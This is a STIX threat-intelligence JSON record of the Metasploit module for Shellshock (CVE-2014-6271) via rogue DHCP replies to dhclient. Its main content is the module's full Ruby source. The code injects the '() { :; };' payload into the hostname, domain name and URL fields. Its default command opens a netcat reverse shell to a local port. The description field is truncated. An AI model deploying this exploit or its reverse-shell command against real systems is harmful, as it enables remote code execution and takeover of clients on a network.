{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d4f59ae5-0ee9-4306-8c39-10ba4ba1d64d",
    "created": "2024-08-14T16:21:54.846391Z",
    "modified": "2024-08-14T16:21:54.846395Z",
    "name": "DHCP Client Bash Environment Variable Code Injection (Shellshock)",
    "description": " This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets dhclient by responding",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/dhclient_bash_env.rb",
            "external_id": "dhclient_bash_env.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6271"
        },
        {
            "source_name": "reference",
            "url": "https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2014/q3/649"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::DHCPServer\n\n  def initialize\n    super(\n      'Name'        => 'DHCP Client Bash Environment Variable Code Injection (Shellshock)',\n      'Description'    => %q{\n        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell\n        handles external environment variables. This module targets dhclient by responding\n        to DHCP requests with a malicious hostname, domainname, and URL which are then\n        passed to the configuration scripts as environment variables, resulting in code\n        execution.\n      },\n      'Author'      =>\n        [\n          'scriptjunkie', 'apconole[at]yahoo.com', # Original DHCP Server auxiliary module\n          'Stephane Chazelas', # Vulnerability discovery\n          'Ramon de C Valle' # This module\n        ],\n      'License' => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Service', 'Description' => 'Run malicious DHCP server' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Service'\n        ],\n      'DefaultAction'  => 'Service',\n      'References' => [\n        [ 'CVE', '2014-6271' ],\n        [ 'CWE', '94' ],\n        [ 'OSVDB', '112004' ],\n        [ 'EDB', '34765' ],\n        [ 'URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/' ],\n        [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ],\n        [ 'URL', 'https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/' ]\n      ],\n      'DisclosureDate' => 'Sep 24 2014',\n      'Notes' =>\n          {\n              'AKA' => ['Shellshock']\n          }\n    )\n\n    register_options(\n      [\n        OptString.new('CMD', [ true, 'The command to run', '/bin/nc -e /bin/sh 127.0.0.1 4444'])\n      ])\n\n    deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')\n  end\n\n  def run\n    value = \"() { :; }; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore['CMD']}\"\n\n    hash = datastore.copy\n    hash['DOMAINNAME'] = value\n    hash['HOSTNAME'] = value\n    hash['URL'] = value\n\n    # This loop is required because the current DHCP Server exits after the\n    # first interaction.\n    loop do\n      begin\n        start_service(hash)\n\n        while @dhcp.thread.alive?\n          select(nil, nil, nil, 2)\n        end\n\n      rescue Interrupt\n        break\n\n      ensure\n        stop_service\n      end\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "Sep 24 2014"
}